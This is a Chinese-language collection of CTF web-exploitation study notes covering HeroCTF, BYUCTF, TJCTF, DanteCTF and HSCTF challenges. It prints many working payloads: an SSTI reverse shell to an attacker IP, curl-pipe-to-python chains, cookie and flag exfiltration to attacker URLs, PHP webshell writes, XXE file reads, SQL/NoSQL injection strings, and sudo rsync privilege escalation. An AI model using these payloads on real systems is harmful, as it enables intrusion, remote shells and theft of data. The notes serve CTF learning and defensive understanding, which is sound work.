208. [Best_Schools](https://siunam321.github.io/ctf/HeroCTF-v5/Web/Best-Schools/)
- [GraphQL Batching Attack](https://checkmarx.com/blog/didnt-notice-your-rate-limiting-graphql-batching-attack/)利用。在一个request中插入多个query，从而绕过网站自带的rate limit。不仅仅适用于查询用的query，也适用于用于更改数据的mutation query。
```
POST /graphql HTTP/1.1
[
  {
    “variables”: { “id”: 1 },
    “query”: “query User($id: Int!) { … }” //查询的query
  },
  {
    “variables”: { “id”: 2 },
    “query”: "mutation { func(param: \"value\"){id, num} }" //更改数据的mutation query，有点像调用函数
  }
]
```
- 一些graphql入门资料
  - https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql
  - https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
- 利用匿名网络服务tor绕过rate limit：
```sh
while true; do service tor restart; sleep 1; curl --socks5-hostname localhost:9050 -i -s -k -X POST -H $'Content-Type: application/json'  --data-binary $'{\"query\":\"mutation { func(param: \\\"value\\\"){id, num} }\"}' 'http://example.com/graphql';done
```
不断重启tor然后用重启后的tor匿名连接。因为每次匿名连接不会被服务器判断为同一个人，于是绕过limit。
- 直接向console发送mutation query绕过rate limit
```sh
while true; do curl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' -H $'Origin: http://example.com' \
    --data-binary $'{\"query\":\"mutation { func(param: \\\"value\\\"){id, num} func(param: \\\"value\\\"){id, num} }\"}' \
    $'http://example.com/graphql/console'; done
```
209. `*`
210. `*`
211. [Drink from my Flask #1](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Web/Drink_from_my_Flask_1)
- python flask ssti+key爆破、session伪造
    - 反弹shell payload：`{{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/172.17.0.1/9999 0>&1\"').read() }}`,172.17.0.1换为攻击机器外网ip
    - john爆破session key：`john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256`。format可以根据题目要求更改，如HMAC-MD5。使用[脚本](https://github.com/Sjord/jwtcrack/blob/master/jwt2john.py)将jwt转换为john爆破的目标。
    - 此题的一些unintended solutions：
```
/{{config.update(u=config.update)}}
/{{config.u(g="__globals__")}}
/{{config.u(l=lipsum[config.g])}}
/{{config.u(o=config.l['os'])}}
/{{config.u(p=o.popen)}}
/{{config.u(r=request.args)}}?b=cat+app.py&c=cat+flag.txt
/{{config.p(config.r.b).read()}}
/{{config.p(config.r.c).read()}}
``` 
```py
import requests
req = requests.session()
payload = [
    "/{{config.update(a=config.update)}}",
    "/{{config.a(b=\"__globals__\")}}",
    "/{{config.a(c=lipsum[config.b])}}",
    "/{{config.a(d=config.c.os)}}",
    "/{{config.a(e=config.d.popen)}}",
    "/{{config.a(g='curl server')}}",
    "/{{config.a(h='ipaddr:8080')}}",
    "/{{config.a(i='/a|python3')}}",
    "/{{config.a(j=config.g+config.h)}}",
    "/{{config.a(k=config.j+config.i)}}",
    "/{{config.a(k=config.j+config.i)}}"
]
for x in payload:
    req.get(f"http://xxx.com{x}")
print(req.get("http://xxx.com/{{config.e(config.k).read()}}").text)
```
212. [Referrrrer](https://mxcezl.github.io/posts/write-up/ctf/heroctf-v5/web/referrrrer/)
- express 4.x中，`req.header("Referer")`表示取请求中的Referer字段的值，不过请求传`Referrer`同样可以取到值，两者在源码层面是一样的。而nginx.conf里就不能混用（nginx.conf里看的是`$http_referer`)。
- 根据文档：`CaseSensitive: Disabled by default`,express 4.x里的路径名大小写不敏感。访问`/a`和`/A`是一样的。而nginx里location的配置是大小写敏感的
213. DEX相关概念（[uniswap](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/pools)，[liquidity pool](https://www.youtube.com/watch?v=dVJzcFDo498&list=PLHx4UicbtUoYvCvRouZ4XbaDpE7cbCCqo)）以及题目：
- [blockchain2-4](https://github.com/Kaiziron/heroctf-v5/tree/main).另外这个系列有统一的非预期解：https://github.com/J4X-98/Writeups/blob/main/CTFs/HeroCTF/Chal2_3_4/writeup.md
214. [Blogodogo](https://mxcezl.github.io/posts/write-up/ctf/heroctf-v5/web/blogodogo-2/)
- 对于可以提交任意url的地方，可以使用`javascript:code`来执行任意js代码，不一定要带有payload的http url。如果代码太长，就将代码写为一行，然后base64编码执行。`javascript:eval(atob(base64))`
- python flask里的`SESSION_COOKIE_HTTPONLY = True`配置项表示cookie无法被js代码获取。
- redis缓存（caching）的错误使用。
```py
def profile():
    key_name_url = "profile_" + current_user.username.lower() + "_url"
    key_name_username = "profile_" + current_user.username.lower() + "_username" 
    cache_url, cache_username = redis_client.get(key_name_url), redis_client.get(key_name_username)
    if not cache_url or not cache_username:
        redis_client.set(key_name_username, current_user.username)
        redis_client.expire(key_name_username, 60)
        redis_client.set(key_name_url, current_user.url)
        redis_client.expire(key_name_url, 60)
    cache_url, cache_username = redis_client.get(key_name_url).decode(), redis_client.get(key_name_username).decode()
    return render_template("pages/profile.html", title="My profile", form=form,
        cache_url=cache_url, cache_username=cache_username)
```

该段代码检查访问时是否已有缓存，如果有就直接返回缓存。但`current_user.username.lower()`将任意username全部转为小写。如果注册时不要求统一小写，缓存时却要求，可能导致缓存被投毒。攻击者可注册诸如`ADMIN`的账户，在缓存里存入恶意payload。由于大小写不敏感，真正的admin用户访问自己的缓存时也会出现恶意payload，有xss的风险。

215. [Simple Notes](https://mizu.re/post/simple-notes)
- CORS misconfiguration
```
access-control-allow-credentials: true
access-control-allow-origin: null

Access-Control-Allow-Credentials header value is set to true if the server permits the use of credentials, such as cookies or HTTP authentication, in cross-origin requests. This header is sent as part of the server's response to a preflight request.

Access-Control-Allow-Origin header indicates whether the response can be shared with requesting code from the given origin. If the value of this header is set to * (wildcard), it means any origin can access the resource. If a specific origin is set, only that origin can access the resource. If the value is set to null, it can cause security issues and should be avoided
```
这两个搭在一起容易出现安全问题。第一条允许请求里面包含一些登录时的凭证（credentials，如cookie和这题的authorization）。第二条根据[文档](https://docs.w3cub.com/http/headers/access-control-allow-origin)看似安全，毕竟只允许response与origin为null的网站共享。然而有个问题：`the serialization of the Origin of any resource that uses a non-hierarchical scheme (such as data: or file:) and sandboxed documents is defined to be "null".`。所以可以像下面这样利用iframe获取网站的内容（a sandboxed iframe has a null origin）
```js
var host = "https://example.com"
var ifr  = document.createElement("iframe");
ifr.sandbox = "allow-scripts allow-top-navigation";
ifr.srcdoc  = `<script>
    fetch("${host}/api/me").then(d => d.text()).then((d) => {
        alert(d);
    })
<\x2fscript>`;
document.body.appendChild(ifr);
```
- fetch的重定向特性（仅限chromium浏览器）。假如request字段属于developer-controlled（用户不可控制，例如自己在浏览器里设置等是不行的，必须要开发者用代码设置），重定向时会带着上一次的请求中的这类request。参考：https://github.com/whatwg/fetch/issues/944 。举个例子：现在有个用户，他在A.com下有请求头`Authorization: Bearer xxx`，这个请求头属于developer-controlled。现在将他从A.com重定向的B.com。正常情况下发送给B.com的请求是不会带着`Authorization: Bearer xxx`的，然而如果重定向时用的是fetch，发往B.com的请求就会带着了。注意这个“携带”是拷贝的关系，和当前状态下是否还有这个header没关系。比如假设这个header从localStorage取值，而重定向之前有清空localStorage的逻辑。只要用的是fetch来重定向，这个header的值就会有。
  - 假如要用这个特性泄露header里的内容的话，注意重定向的目标网址要返回有效的CORS。可以用flask搭一个。意味着这类题要有公网ip，而且还要是HTTPS。
```py
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
cors = CORS(app, resources={
    r"/*": {
        "origins": "*"
    }
}, allow_headers=[
    "Authorization",
    "Content-Type"
], supports_credentials=True)

@app.route("/")
def index():
    print(request.headers)
    return ""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5555, ssl_context=("cert/cert.pem", "cert/key.pem")) #cert和key这题源码有给，不确定是不是一定要从题目获取
```
216. [YouWatch](https://mizu.re/post/youwatch)
- `<span dangerouslySetInnerHTML={{ __html: `${msg}` }}></span>`允许以html的形式直接插入msg的内容。就算过滤十分严格可能无法直接xss，也可以考虑dom clobbering。
- NextJS DOM Clobbering。似乎是作者自己发现的一个漏洞，详细内容在wp里，尚且不确定是否仅适用于这道题
217. [Drink from my Flask #2](https://github.com/HeroCTF/HeroCTF_v5/tree/main/System/Drink_from_my_Flask_2)
- flaskdev debug console pin码伪造。flaskdev pin码的生成函数与普通flask的生成函数有点不同，多了一个变量。这些变量分别是：
```
probably_public_bits = [
    'flaskdev',# username
    'flask.app',# modname
    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
    '/usr/local/lib/python3.8/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private bits:

mac address的十进制
cat /sys/class/net/eth0/address
python3 -c "print(int('mac'.replace(':',''), 16))"
或者
python3 -c "import uuid;print(str(uuid.getnode()))"

/etc/machine-id拼接/proc/self/cgroup

cat /etc/machine-id
49bab8e92cca463691a8b330fc54cc89
cat /proc/self/cgroup
0::/

如果是上面这种情况的话（第二个文件的斜杠后没有内容），这一栏对应的private element是49bab8e92cca463691a8b330fc54cc89

flaskdev addition。此位为开发者设置，无固定要求
```
脚本在wp里。debug console界面在`/console`

218. [A woman's weapon](https://v0lk3n.github.io/writeup/HeroCTFv5/HeroCTFv5-SystemCollection#lfm2)
- php 日志文件（log）包含导致LFI->RCE。
- 利用/usr/bin/rsync提权。https://gtfobins.github.io/gtfobins/rsync/ 。首先使用`sudo -l`查看`/usr/bin/rsync`是否具有suid。若有，则可利用该命令将当前用户提权到suid的用户。`sudo -u <suid-user> /usr/bin/rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null`
- 利用python命令生成交互shell.`python3 -c 'import pty; pty.spawn("/bin/bash")'`
219. [admin:admin](https://v0lk3n.github.io/writeup/HeroCTFv5/HeroCTFv5-SystemCollection#lfm3)
- YouTrack SSTI漏洞：[CVE-2021-25770](https://www.synacktiv.com/en/publications/exploiting-cve-2021-25770-a-server-side-template-injection-in-youtrack.html).payload:
```
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cmd")}
```
220. [I use ZSH btw](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Misc/I_Use_Zsh_Btw)
- 利用`.git`文件夹内的config文件的fsmonitor实现RCE。 https://www.youtube.com/watch?v=kjIGfOgh3UI&t=18708s 。适用于zsh，fish等使用git module的shell。这些类型的shell内部使用git module执行以下操作：
  - git status
  - parse `.git/config`文件
  - 在config里寻找fsmonitor选项并执行.fsmonitor用于更改获取两个git版本区别的diff可执行文件，问题在于可以随便改，自然就能RCE了
- shell将具有以下内容的文件夹看作有效的`.git`文件夹：
  - HEAD文件
  - config文件（也是插入payload的地方）
  - objects和refs文件夹。这两个文件夹可以是空的，但是必须要有
- 另一道题：[GitBad](https://blog.gehaxelt.in/p/l3ak-ctf-2025-writeups-2025-07-13)
    - 如果当前repo使用`git submodule`添加了子repo，则子repo中配置的fsmonitor仍然可以触发rce
    - https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md
    - 若禁用了fsmonitor，还可以像 https://enigma522.online/posts/ctf/gitbad-l3ak 一样触发http请求
221. [[GKCTF 2021]CheckBot](https://blog.csdn.net/cjdgg/article/details/121504021)
- xss（或者csrf？）假设可以将任意url发送给admin bot，以下为本地服务器部署的提取flag的html。
```html
<html>
        <body>
                <iframe id="flag" src="想要admin访问的有flag的url"></iframe>
                <script>
                        window.onload = function(){
                        let flag = document.getElementById("flag").contentWindow.document.getElementById("flag").innerHTML;
                        var exportFlag = new XMLHttpRequest();
                        exportFlag.open('get', '公网ip服务器url/flagis-' + window.btoa(flag));
                        exportFlag.send();
                        }
                </script>
        </body>
</html>
```
提交给admin bot的url为部署以上代码的公网url

222. [urmombotnetdotnet.com 4](https://github.com/BYU-CSA/BYUCTF-2023/blob/main/urmombotnetdotnet.com/Chall4.md)
- sql的数据库会忽略类似`\u0000`的unicode，但python不会。意味着当注册一个用户名`\u0000\u0000\u0000a`时，python使用len函数的结果是4。后续可以用用户名`a`查询出来这个用户。
223. [urmombotnetdotnet.com 5](https://github.com/BYU-CSA/BYUCTF-2023/blob/main/urmombotnetdotnet.com/Chall5.md)
- IPv6 have a scope field that is an arbitrary string using the % delimiter. For example, the following IPv6 address is valid:2001:db8::1000%random`
224. [Notes](https://github.com/BYU-CSA/BYUCTF-2023/tree/main/notes)
- 使用python+ngrok搭建临时公网ip网站。对于没有限制提交给admin bot的url的xss/csrf题目，可以将bot引到自己搭建的网站上执行任意恶意payload（所以大部分题目都会限制提交给bot的url必须是同一个域名）。
  - 将solve.html保存在一个文件夹内，并在相同文件夹下运行`python3 -m http.server`
  - 运行`ngrok http 8000`（python开启的server默认端口8000，如果是其他端口就换成对应的端口号），Forwarding处有ngrok给出的子域名（subdomain）。
  - 现在即可使用subdomain+/solve.html访问。即文件保存在的文件夹是网站的根目录。
- Chrome 80+ 默认将cookie设为SameSite Lax（除非服务器自己设置为别的），意味着cookie “will be sent only in GET request in top window navigations such as `<a>` tag, window.open()..”。但是有个例外，如果一个cookie是新设置的或者被改动过，两分钟内cookie会被设为SameSite None，两分钟后才会恢复成Lax。在这两分钟的期限内可以随意cross origin，例如利用forms。https://medium.com/@renwa/bypass-samesite-cookies-default-to-lax-and-get-csrf-343ba09b9f2b
225. [HUUP](https://github.com/BYU-CSA/BYUCTF-2023/tree/main/HUUP)
- 使用python socket库建立udp连接（udp传输http request）。
```py
import socket
UDP_IP = 
UDP_PORT = 
def req(path):
    http_get = f"GET /{path} HTTP/1.1" + "\x0d\x0a"
    http_get += "Host: xxx" + "\x0d\x0a"
    http_get += "Connection: close" + "\x0d\x0a"
    http_get += "\x0d\x0a"
    MESSAGE = http_get
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
    s.connect((UDP_IP, UDP_PORT))
    s.send(bytes(MESSAGE, "utf-8"))
    res = s.recv(1024)
    return res.decode()
```
用udp传输http request需要多次执行，一次不一定能得到结果（服务器会返回200，但是没有实际body内容）。因为udp有很高的概率只传header但不传content body，导致request格式不对得不到返回结果。
- 像这道题的情况也可以尝试发送一个`GET / HTTP/0.9`请求。HTTP/0.9是http的第一个版本，“It's a one-line protocol with no headers”。这个协议就不用担心udp不传body了，它只有一行，无需多次执行。
226. [EasyTP](https://blog.csdn.net/RABCDXB/article/details/122264363)
- thinkphp3.2.3反序列化pop链(sql注入&文件读取)：https://f5.pm/go-53579.html 。wp内包含报错注入，[开堆叠写shell](https://www.zhaoj.in/read-6859.html#WEB3_easytp)以及利用[rogue-mysql-server](https://github.com/allyshka/Rogue-MySql-Server):https://www.crisprx.top/archives/412#CTF_2021EasyTP 三种解法。注意事项：
  - 需要已知sql数据库的名称及密码
  - 最后一种解法需要公网ip
  - 报错注入解法使用的updatexml最多只能显示32位，需要搭配substr，reverse或mid（跟substr感觉差不多）获取完整flag。
  - 蚁剑版本不同，开堆叠写shell后连接sql数据库的结果也不同。蚁剑要是不行就用冰蝎的导出功能。
- thinkphp可通过输入不存在的控制器获取版本。`http://xxx.com/index.php/aaa`
227. [wzsc_文件上传](https://blog.csdn.net/qq_45608153/article/details/126312379)
- 文件上传条件竞争。服务器检测上传文件的后缀时，使用白名单会比黑名单过滤效果更好。但业务逻辑不能是“上传文件->服务器保存文件->保存后检测刚刚保存文件的后缀，如果不在百名单就删除“。这样容易出现条件竞争。在服务器保存和删除的间隙中，文件是可访问的。
```py
import threading
import os
import requests

class RaceCondition(threading.Thread):
    def __init__(self,url,fileName):
        threading.Thread.__init__(self)
        self.baseUrl=url
        self.fileUrl = self.baseUrl+'/upload/a.php'
        self.shellUrl =self.baseUrl+'/upload/shell.php'
        self.fileName=fileName

    def _get(self):
        r = requests.get(self.fileUrl)
        if r.status_code == 200:
            print('[*] create file shell.php success.')
            os._exit(0)

    def _upload(self):
        rs = requests.get(self.shellUrl)
        if rs.status_code == 200:
            print('[*] create file shell.php success.')
            os._exit(0)

    def run(self):
        while True:
            self.upload_file()
            self._get()
            self._upload()
    def upload_file(self):
        file = open(self.fileName, "rb")
        files = {"file": file}
        res=requests.post(self.baseUrl+"/upload.php",files=files)

if __name__ == '__main__':
    threads = 50

    for i in range(threads):
        t = RaceCondition("","")
        t.start()

    for i in range(threads):
        t.join()
```
228. [ez-sql](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/ez-sql),[wp](https://www.youtube.com/watch?v=AqV3YUtcKGU&t=440s)
- LIKE字段处的sql注入。`SELECT * FROM table WHERE column LIKE '%name%'`,其中name内容完全可控。LIKE语句并不会影响union等多种注入的手法，`%`号表示匹配0或多个任意字符，也不会影响注入的结果。
- 当在express web里看见：
```js
const app = express();
app.use(express.urlencoded({ extended: true }));
```
表示url可传递数组。若网站逻辑没有明显区分传递的参数类型（如字符串与数组，两者都有length字段），此时就能考虑是否有type confusion了。
- js打印数组特性。
```js
name=['a','b'];
SELECT * FROM table WHERE column LIKE '%${name}%';
//SELECT * FROM jokes WHERE joke LIKE '%a,b%'
```
数组元素之间会用`,`连接起来。
- 当sql注入点在url传入的参数且参数是个数组时，可利用sqlmap注入url的数组传参。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --level 5 --risk 3 --dbms=sqlite --tables -dump`。如果数据库的类型不知道也可以不指定。此为测试语句，当测试出来哪种方法最快时，可以直接对sqlmap指定注入方式(例如union select)。`sqlmap --url "http://xxx.com/search?name[0]=a&name[1]=2" -p "name[0]" --dbms=sqlite --tables --technique=U`
- sqlite的union联合注入( https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md )
    - 查表名：`' UNION SELECT 1, sql FROM sqlite_master WHERE type="table" --`,`' UNION SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%`
    - 查column名称：`' UNION SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name like 'table'--`
    - 查字段：`' UNION SELECT 1, flag FROM table--`,`' UNION SELECT column FROM mystery WHERE column like 'flag'--`,`'union select * from table --`
- [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html)可预防sql注入，当题目里出现这些逻辑时就可以放弃考虑sql注入了
229. [yolo](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/yolo),[wp](https://www.youtube.com/watch?v=AqV3YUtcKGU&t=1123s)
- CSP `script-src 'nonce-test'`指定只有带着`test`的script标签才能执行js。例如`<script>alert(1)</script>`会被浏览器阻挡，但`<script nonce="test">alert(1)</script>`则能执行（因为其指定的nonce值和服务器设置的csp值一致）
- CSP `default-src 'self'`阻挡了跨域fetch。如当前domain为`http://a.com`，fetch填写的url就只能是这个域名，`fetch("http://b.com")`会被浏览器阻挡。这种情况下的xss可以借助window.location将数据带出到webhook。`<script>window.location =ATTACKER_URL?x=document.cookie</script>`.写成`window['location']`或者`document.location`也是可以的。
230. [complainer](https://github.com/TJCSec/tjctf-2023-challenges/tree/main/web/complainer)
- 利用url重定向（redirect）实现xss。这题的非预期解在于/login路由会重定向：`/login?next=url`。即使能提交给admin bot的url只能是同域的，但是可以更改重定向的url为`javascript: url`，即可让bot执行任意js代码。
231. [CryptoMarket](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#cryptomarket)
- 使用curl发送HEAD请求：`curl -I <url> -vv`。也可使用python request库(获取cookie)：`request.head("url").cookies.get_dict()['name']`
- 构建字典并使用模块化的[flask unsign](https://pypi.org/project/flask-unsign/)爆破flask session SECRET_KEY
232. [Dumb Admin](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#dumb-admin)
- php文件上传基础绕过：https://book.hacktricks.xyz/pentesting-web/file-upload 。当shell.php的后缀不允许时，尝试用shell.png.php绕过（随便在前面加个符合上传要求的后缀）
- php exif_imagetype函数绕过：
     - 在shell文件前加上jpg文件头ffd8ffee(或者GIF89A)
     - 将shell使用exiftool插入图片的comment中：`exiftool -Comment="<?php system(\$_GET['cmd']) ?>" image.jpg` https://m44lr0m.vercel.app/writeups/dantectf-2023-web-challenges
234. [FlagShop](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#flagshop)
- js Object.assign函数不会导致严格意义上的[原型链污染](https://www.freebuf.com/articles/web/275619.html)。它确实会影响被assign的实例，但不会影响到对象本身。
```js
function A(){}
let a=new A();
let b={"__proto__":{"x":1}}; //let b={"x":1};
Object.assign(a,b);
//a实例会有x这个属性，但是A对象的__proto__并未被污染，还是Object。当然后面像那种不要__proto__也可以让a有x属性
```
- [integrity](https://www.w3.org/TR/SRI/)属性。在程序导入例如jQuery的外部库时，可能会使用integrity属性来保证引入的库是官方的而没有被修改过。jQuery的官方intergrity值可在[这里](https://releases.jquery.com/jquery/)找到。当程序标注的integrity与官方不同或者导入路径奇怪时（例如从本地而不是云端导入库），就要查看源码，里面与官方不同的地方可能就是漏洞的入手点。
- js寻找document中active的元素，并利用jQuery设置其内部html
    ```js
    if (document.activeElement.id === add.getAttribute('id')){
        message.html(getRoleText); //jQuery里直接设置html容易导致xss，append(),after()等同理。 
    }
    //By design, any jQuery constructor or method that accepts an HTML string — jQuery(), .append(), .after(), etc. — can potentially execute code. This can occur by injection of script tags or use of HTML attributes that execute code (for example, <img onload="">). Do not use these methods to insert strings obtained from untrusted sources such as URL query parameters, cookies, or form inputs.
    ```
    想要进入这个if分支要保证add的id为document中活跃元素的id，或者说add为活跃元素。xss里有两种方法解决：
    - 任意找一个类似`<div>`的tag，设置其id为空。`<div id=""></div>`
    - 找focusable的tag，如`<a>`,上种方法的`<div>`就不行。在url的最后加上anchor或autofocus指向`<a>`标签的id。`http://<a href='url' id='foo'>#foo`
235. [SecureHashedDb](https://born2scan.run/writeups/2023/06/02/DanteCTF.html#securehasheddb)
- python bcrypt模块的bcrypt.checkpw函数可检查linux `$2y$`或`$2a$`bcrypt hash format。bcrypt hash可由htpasswd命令得来，或者用python：
```py
from passlib.hash import bcrypt
# htpasswd -bnBC 10 "" password | tr -d ':\n' | sed 's/$2y/$2a/'
hash = bcrypt.using(rounds=4).hash("data", ident="2y") #rounds 4 faster to generate
#linux的bcrypt hash即使是hash相同的字符串，每次也会得到不同的结果。因为每次hash都会有不同的随机salt加入hash
#https://stackoverflow.com/questions/66050881/bcrypt-different-hash-for-same-string
```
- mysql注入相关
  - 利用LIKE语句延时注入（Time Based Sql Injection）
    - 获取要爆出的数据的长度：`' or (select (select username from user LIMIT 1 OFFSET {offset}) AS ll having ll LIKE BINARY "{pattern}" and sleep(2)) -- abcd`。注意在使用LIKE语句时，永远搭配上binary关键字来区分大小写。
    - 爆数据：`' or (select (select username from user LIMIT 1 OFFSET {offset}) AS ll having ll LIKE BINARY "{pattern}" and sleep(2)) -- abcd`
  - 利用union select构造虚拟查询结果伪造身份登录。类似`28. sql注入`提到的内容，当应用限制必须要查出某个特定的用户名或是其他情况导致简单的`'or 1=1--`不能用时，可以利用联合查询构造出制定的用户信息。`' union select 1,(select username from user limit 1 offset 0),pwd--`.
  - mysql可用16进制表示法（0x开头）作为column里的数据（例如上一条的pwd可换为`0x...`），mysql会自动将其解码
- php sql的exec函数允许插入多个sql语句（即堆叠注入）。可用以下payload：
```php
;ATTACH DATABASE '/tmp/lol.php' AS lol;
CREATE TABLE lol.pwn (dataz text);
INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");--
//https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database
```
在/tmp目录下创建一个连接至lol.php文件的数据库 。然后创建名为pwn的table，并往table里插入php代码。或者说往里面写了个shell。
- 此题预期解是利用php的反序列化漏洞实现rce。另一种方法在[这里](https://spiky-enquiry-e91.notion.site/Secure-Hashed-DB-25aee784ba96429e8b07586d43ea7016)有提到。因为应用内部调用了file_get_contents，且参数可控。于是可直接控制参数为`php://input`,然后传post参数为想读取的文件即可。另外也有人提到可用[PHP FILTER CHAINS](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle)（[工具](https://github.com/synacktiv/php_filter_chains_oracle_exploit)）。不过这种解法会产生非常长的payload，有时候会引发服务器502.
236. [Flag Shop](https://theromanxpl0it.github.io/ctf_hsctf2023/2023/06/12/flagshop.html)
- mongo db Blind [NoSQL](https://www.talend.com/resources/sql-vs-nosql/) injection(python)
    - [$where](https://www.mongodb.com/docs/manual/reference/operator/query/where/#mongodb-query-op.-where)注入：虽然是“nosql”，但是在不过滤用户输入，直接拼接参数的情况下也会引发注入。该子句用于`db.flags.find()`中，会执行任何传递给它的js代码。例：
```py
results = db.flags.find(
{
"$where": f"this.challenge.includes('{request.json['search']}')"
}, {
"_id": False,
"flag": False
})
```
此时可以尝试闭合实现注入。可以用分号注入多个句子：`'); this.flag.includes('flag{`，不过只有最后一个有效的条件会被执行，等于数据库实际查找的条件是`this.flag.includes('flag{`，忽略前面的`this.challenge.includes('')`。同理，也可用`&&`:`') && this.challenge.includes('flag')`。或者`||`:`'); 1==1 || this.challenge.includes('`。除了使用includes，还可使用`startsWith`:`') && this.flag.startsWith('`

237. [png-wizard-v3](https://github.com/hsncsclub/hsctf-10-challenges/tree/main/web/png-wizard-v3),[wp](https://kos0ng.gitbook.io/ctfs/ctfs/write-up/2023/hsctf/web-exploitation#png-wizard-v3-8-solves)
- svg文件相关Error-based XXE. 以下处理svg data的逻辑具有xxe漏洞：
    ```py
    svg_root=etree.parse(filename,parser=etree.XMLParser()).getroot()
    drawing=SvgRenderer(filename).render(svg_root)
    ```
当用户输入的xxe payload在服务端无回显时（无法下载xxe payload渲染后的结果文件，服务器只返回渲染是否成功而没有成品等），使用Error-based XXE。详情见：https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
```xml
<?xml version="1.1" standalone="no" ?>
<!DOCTYPE svg  [
    <!ENTITY % NUMBER '
        <!ENTITY &#x25; file SYSTEM "file:///app/flag.txt">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %NUMBER;
]>
<!--file://为任意不存在的路径-->
<svg xmlns="http://www.w3.org/2000/svg" version="1.1"> <!--最后这一段不同题填的不同，写符合题目语境就好-->
&a;
</svg>
```
- 其他解法/unintended:
    ```xml
    <!--unintended-->
    <?xml version="1.1"?>
    <!DOCTYPE svg [
        <!ENTITY xxe SYSTEM "/app/flag.txt">
    ]>
    <svg viewBox="0 0 1000 300" class="test">
    <style>
    .test {
        width: &xxe;;
    }
    </style>
    <text>EXPLOIT</text>
    </svg>
    ```
    ```xml
    <!--localdtd-->
    <?xml version="1.0" standalone="yes"?>
    <!DOCTYPE bruh [
    <!ENTITY % localdtd SYSTEM "file:///usr/share/xml/docutils/docutils.dtd">
    <!ENTITY % yesorno '
    <!ENTITY &#x25; file SYSTEM "file:///app/flag.txt">
    <!ENTITY &#x25; eval "
    <!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///bruh/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %yesorno;
    ]>
    ```
238. [mongodb](https://xhacka.github.io/posts/mogodb/)
- mongodb/[no sql injection](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)的绕过登录payload。例：
    ```py
    #https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code/83234
    user = db.users.find_one(
        {
        "$where":
        f"this.user === '{request.form['user']}' && this.password === '{request.form['password']}'"
        }
    )
    ```
    - 用户名：`' == '`，密码为空
    - 用户名与密码均为：`' || 'a'=='a`
239. [Very Secure](https://xhacka.github.io/posts/Very-Secure/)
- flask session secret key爆破：flask-unsign+字典。`flask-unsign --wordlist ./keys --cookie '' --unsign --no-literal-eval`。字典格式：每个key之间用`\n`分隔
- 如果不想用字典，也可以直接在程序里爆破key
```py
import itertools
import zlib
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import base64_decode

# from https://github.com/noraj/flask-session-cookie-manager/blob/master/flask_session_cookie_manager3.py
class MockApp(object):
	def __init__(self, secret_key):
		self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
	""" Encode a Flask session cookie """
	try:
		app = MockApp(secret_key)
		
		session_cookie_structure = session_cookie_structure
		si = SecureCookieSessionInterface()
		s = si.get_signing_serializer(app)
		
		return s.dumps(session_cookie_structure)
	except Exception as e:
		return "[Encoding error] {}".format(e)

def decode(session_cookie_value, secret_key=None):
	""" Decode a Flask cookie  """
	if (secret_key == None):
		compressed = False
		payload = session_cookie_value
		
		if payload.startswith('.'):
			compressed = True
			payload = payload[1:]
		
		data = payload.split(".")[0]
		
		data = base64_decode(data)
		if compressed:
			data = zlib.decompress(data)
		
		return data
	else:
		app = MockApp(secret_key)
		
		si = SecureCookieSessionInterface()
		s = si.get_signing_serializer(app)
		
		return s.loads(session_cookie_value)
cookie = 
for c in itertools.product(range(0, 256), repeat=2):
	k = bytes(c)
	try:
		print(decode(cookie, k))
	except Exception as e:
		pass
	else:
		print(k)
		break
```
240. [west-side-story](https://ebonyx.notion.site/web-west-side-story-27bed9514e14478a8ab4c3fd772dc011)
- python与mariadb处理json重复键名时的不同操作：python看最后一个key，mariadb看第一个。如：
```
json={"admin":true, "admin":false}
print(json['admin'])
python:false
mariadb:true
```
json由处理差异导致的漏洞可参考 https://bishopfox.com/blog/json-interoperability-vulnerabilities ，从这里面提到的内容入手
- go相关解析差异见 https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers

241. [RESTful swap](https://xhacka.github.io/posts/RESTful-swap)
